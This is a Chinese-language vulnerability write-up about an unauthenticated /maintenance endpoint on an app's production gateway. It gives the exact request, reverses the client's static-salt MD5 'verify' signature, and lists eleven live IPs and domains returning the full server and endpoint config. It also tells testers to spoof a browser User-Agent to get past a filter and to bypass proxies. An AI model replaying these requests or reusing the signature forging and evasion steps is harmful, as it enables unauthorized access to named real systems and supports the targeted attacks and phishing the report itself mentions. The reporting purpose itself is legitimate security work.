## 目标
自研 App 后端生产网关的 `/maintenance`（GetMaintenance 处理器），46750 端口分组；同一配置还以 CloudFront 别名形态在 443 暴露。无需任何账号/凭据/Cookie/会话。

## 请求（无需任何凭据）
```
POST /maintenance HTTP/1.1
Host: 47.100.166.127:46750
Content-Type: application/json;charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36

{"version":"0.0.0.0","userid":0,"channel":"vip_1","verify":"9A0BEE24A692E5B5E3EE3C12F69EBCDA"}
```

## verify 算法（客户端静态，可离线复算）
- preimage = 按键名升序把 `key+value` 裸拼 + 静态盐 `private_maintenance`
- 本请求 preimage = `channelvip_1userid0version0.0.0.0private_maintenance`
- verify = UPPER(MD5(preimage)) = `9A0BEE24A692E5B5E3EE3C12F69EBCDA`
- 换 userid 必须重算（userid 参与签名）。未登录时客户端 PlayerPrefs.USERID 缺省 = 0。
- channel 取客户端渠道配置里的字面量，当前只有一个可用值。

## 响应（200 / 3469B / sha16=7E24C11C45283013，全部入口逐字节相同）
```json
{"ret":0,"data":{
 "maintenance":0,"notice":"...",
 "agents":[{"agent":"1","version":"1.0.0.9","download":"https://download.<厂商域>/"}, ...x4],
 "accessurl":{"https://<46750 主入口>":0, ... 共 15 条，type 0=46750 / type 2=46712 旧网关与域名入口},
 "accessregionurl":[{"url":"...","type":0,"weight":99,"area":"GL|HK|CN|MY|US"} x15],
 "servers":[{"id":1,"type":1,"weight":99,"ip":"0.0.0.0","port":26710,"domain":"...:36610","area":"GL","comment":"..."} ... 共 11 台 36610],
 "wxservice":"Telegram : @<官方句柄>","wxservicealert":"<官方句柄>"
}}
```

## 影响面：9 处入口同型同 sha16（2026-11-05 逐台定型，间隔 6.3s，只读）
| # | 入口 | 命中响应 | 备注 |
|---|---|---|---|
| 1 | 47.100.166.127:46750 | 200/3469B/ret=0/7E24C11C45283013（0.27s） | 未映射 GET → RemoteDisconnected 0.1s |
| 2 | 43.139.167.210:46750 | 同上（0.25s） | |
| 3 | 34.92.112.63:46750 | 同上（0.27s） | |
| 4 | 23.224.93.244:46750 | 同上（1.08s） | |
| 5 | cbob.evuzp9.com:46750 | 同上（0.37s） | 未映射 GET → GCP LB 403/134B |
| 6 | 110.41.227.204:46750 | 同上（0.36s） | |
| 7 | nazu.klwfqk.com:46750 | 同上（0.52s） | 未映射 GET → awselb/2.0 403/520B |
| 8 | uips.pmcqef.com:46750 | 同上（0.5s 级） | |
| 9 | 1fy6.h34zsd.cc:443 | 同上（0.33s） | CNAME d17z5ekcbcfmzh.cloudfront.net；未映射 GET → CloudFront 502/932B，**该别名并非断链** |

> 前序实测另有两处同型：47.242.109.76:46750、139.95.8.48:46750（同 sha16）。合计 11 处入口指向同一份运营配置。
> 返回的 data 与本地留存产物逐字节一致（sha16 相同，3469B）：accessurl 15 条、accessregionurl 15 条（area/weight）、servers 11 台 :36610、agents 4 条、官方 Telegram 句柄。

## 三发定型法（判据必须成套，否则易假阳性/假阴性）
| 探针 | 期望回显 | 结论 |
|---|---|---|
| ① 已注册路由基线：`POST /notices` + 错误 verify | 200 / 39B / `{"ret":1,"msg":"参数检查失败！"}` / sha16=28C525732CCC2EFD | 路由存在，签名门生效 |
| ② 未映射基线：`GET /<随机串>` | IP 直连 RemoteDisconnected 0.1s；前置 LB 则 GCP 403/134B、awselb 403/520B、CloudFront 502/932B | 该路径确实未注册 |
| ③ 命中：`POST /maintenance` 4 字段正确 verify | 200 / 3469B / ret=0 / sha16=7E24C11C45283013 | 签名通过，返回全量配置 |

- **命中来自签名通过，不是宽松解析**：③ 的 ret=0 与 ① 的 ret=1 在同一主机上只差 verify，且 ① 的 39B 体在各主机逐字节一致。
- **证伪条件**：任一主机在 4 字段正确 verify 下回 39B ret=1 或 sha16 不同，即该主机不属于本族（可能只是同名端口/同厂商不同集群）。

## 常见失败原因
| 现象 | 结论 |
|---|---|
| 200 / 39B / sha16=28C525732CCC2EFD / ret=1 | 参数或签名校验失败——先查盐字面量，再查字段集是否打错处理器 |
| 7 字段正确 verify 在 46750 回 ret=1 | 正常：7 字段 GetServerInfoByheadUrl 只在 47000；4 字段在 47000 也恒回 ret=1 |
| POST 未映射路径 READ timeout ≥5s 或 RemoteDisconnected | 本网关无 404，用「秒回 ret=1」判已注册路由 |
| curl 默认 UA 被 403 `TEST-ERROR` | 必须伪装浏览器 UA |
| IP 字面量走平台代理 TLS 建链失败 rc=35 | 必须 `--noproxy '*'` / `requests(trust_env=False)` |
| 命中但内容与既有产物不同 | 可能打到了另一套集群，按 sha16 区分并单独记录 |

## 操作纪律
固定出口 IP、单发不重放、间隔 ≥5–6s、全程只读（本轮 45 发 / 6.3s 间隔）。

## 影响
无凭据拿到全部生产 API 入口（含 46712 旧网关与域名级入口）、11 台实时游戏服地址与区域权重、客户端下载源与官方联系方式，可支撑定向攻击与钓鱼；同一份配置横跨 11 处入口（含 CDN 别名）说明该签名机制不构成访问控制，封禁单台/单域无效，须按 accessurl 全量收敛。